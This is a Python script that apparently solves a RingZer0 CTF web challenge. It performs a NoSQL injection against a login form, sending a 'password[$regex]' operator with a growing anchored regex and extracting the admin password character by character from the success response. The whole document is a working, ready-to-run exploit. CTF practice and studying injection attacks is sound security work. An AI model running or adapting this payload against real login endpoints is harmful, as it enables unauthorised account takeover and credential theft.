import requests
import string

# Base URL and endpoint
url = 'http://challenges.ringzer0ctf.com:10309'

# Initialize possible characters
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '-'
found = ''  # Keep track of found characters

while True:
    for char in chars:

        # Formulate regex
        regex = f'^{found}{char}' # ^ character is used to mark start of the string
        payload = {
            'username': 'admin',
            'password[$regex]': regex
        }

        # Send POST request
        response = requests.post(url, data=payload)

        # Check if the response contains the success message
        if "<h1>Welcome. Keep looking, the flag is not here.</h1>" in response.text:
            found += char
            print(f"Current match: {found}")
            break
    else:
        # Exit loop if no character matches
        print(f"Final password: {found}")
        break
